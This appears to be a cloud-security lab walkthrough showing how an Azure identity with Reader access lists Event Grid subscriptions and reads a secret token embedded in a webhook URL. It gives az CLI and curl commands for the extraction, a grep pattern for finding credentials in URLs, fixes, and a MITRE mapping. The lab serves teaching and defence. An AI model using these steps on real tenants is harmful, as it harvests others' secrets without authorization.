# Event Grid — Webhook Token Exposure via ARM

**Provider:** Azure | **Category:** Integration / Secrets

## Scenario

A team set up an Azure Event Grid subscription to push events to an internal
webhook. To authenticate the webhook receiver they embedded a secret token
directly in the **webhook URL as a query parameter**. The full URL — including the
token — is stored in the event subscription definition and returned by the ARM API
to any identity with **Reader** on the resource.

## Attack Path

```
[Attacker] Azure AD user (Reader on Resource Group)
    |
    v
az eventgrid event-subscription list --source-resource-id <topic-id>
    |
    v
az eventgrid event-subscription show  -->  full subscription JSON
    |
    v
destination.endpointUrl  -->  webhook URL containing ?token=<flag>
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — Get the topic resource ID

```bash
RESOURCE_GROUP="<resource_group_name>"
TOPIC_NAME="<topic_name>"
SUBSCRIPTION_ID=$(az account show --query id -o tsv)

TOPIC_ID="/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.EventGrid/topics/${TOPIC_NAME}"
```

### Step 3 — List event subscriptions

```bash
az eventgrid event-subscription list \
  --source-resource-id "${TOPIC_ID}" \
  --output table
```

### Step 4 — Dump the webhook URL

```bash
az eventgrid event-subscription show \
  --name production-notify \
  --source-resource-id "${TOPIC_ID}" \
  --query "destination.endpointUrl" \
  --output tsv
```

The `token` query parameter in the URL contains the flag.

### Alternative — ARM REST API

```bash
TOKEN=$(az account get-access-token --query accessToken -o tsv)

curl -s \
  "https://management.azure.com${TOPIC_ID}/providers/Microsoft.EventGrid/eventSubscriptions/production-notify?api-version=2022-06-15" \
  -H "Authorization: Bearer ${TOKEN}" | \
  jq '.properties.destination.endpointUrl'
```

## How to Fix in Production

1. **Use Azure Event Grid Delivery Properties** with Key Vault references for
   authentication headers instead of embedding secrets in the URL.
2. **Use webhook signature validation** — Event Grid can sign payloads with an
   HMAC; validate the signature on the receiver side rather than relying on a
   secret URL token.
3. **Restrict Reader access** on Event Grid resources if the subscription contains
   sensitive endpoint configuration.
4. **Audit event subscriptions** for credentials in webhook URLs:
   ```bash
   az eventgrid event-subscription list --location global \
     --query "[*].destination.endpointUrl" -o tsv | \
     grep -E '[?&](token|key|secret|password)='
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
